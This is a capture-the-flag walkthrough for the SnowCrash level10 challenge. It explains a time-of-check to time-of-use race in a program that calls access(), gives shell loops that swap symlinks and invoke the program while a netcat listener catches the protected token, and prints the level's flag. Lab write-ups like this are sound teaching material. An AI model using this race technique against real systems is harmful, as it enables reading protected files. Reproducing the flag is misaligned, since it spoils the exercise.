
# SnowCrash Level10 Walkthrough

This walkthrough explains how we exploited a race condition vulnerability in `level10` to retrieve the flag.

---

## 🧭 Step 1: Exploring the Environment

Once logged in as `level10`, we check the contents of the home directory:

```bash
level10@SnowCrash:~$ ls
level10  token
```

- `level10`: an executable file  
- `token`: a file we presumably need access to, but it's protected

---

## ⚙️ Step 2: Understanding the Executable

Running the executable without arguments gives us usage instructions:

```bash
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```

Trying it on the `token`:

```bash
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```

As expected, we’re denied access.

---

## 🧠 Step 3: Investigating the Vulnerability

After some research, we find that the program likely uses the `access()` system call to check permissions. This system call is **insecure** because it introduces a **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability.

The `man access` page even warns:

> ⚠️ Warning: Using these calls to check if a user is authorized to open a file before actually doing so creates a security hole...

This means we can exploit the short window between the check and the use of the file by **swapping a symbolic link** quickly.

---

## 🛠️ Step 4: Exploiting the Race Condition

We’ll use three terminals to exploit this vulnerability.

### 🖥️ Terminal 1: Setup Toggle Between Symlinks

```bash
echo "hello" > /tmp/file

while true; do
    ln -sf ~/token /tmp/file2
    ln -sf /tmp/file /tmp/file2
done
```

This script constantly switches `file2` between a harmless file and the protected `token`.

### 🖥️ Terminal 2: Continuously Invoke the Vulnerable Program

```bash
while true; do
    ./level10 /tmp/file2 127.0.0.1
done
```

This attempts to send `file2` to localhost, hoping to catch the moment `file2` is pointing to `token`.

### 🖥️ Terminal 3: Listen for the Flag Using Netcat

```bash
nc -lk 127.0.0.1 6969
```

If the race condition is successful, the content of `token` will be sent here.

---

## 🏁 Step 5: Retrieve the Flag

Eventually, we catch the right moment, and the server sends the flag to the netcat listener:

```
woupa2yuojeeaaed06riuj63c
```

---

## ✅ Summary

- Discovered a race condition vulnerability in how the executable uses `access()` and `open()`.
- Used symbolic link swapping to bypass the access restriction.
- Listened on localhost to capture the flag when the exploit succeeded.

---

### 🎯 Flag: `woupa2yuojeeaaed06riuj63c`
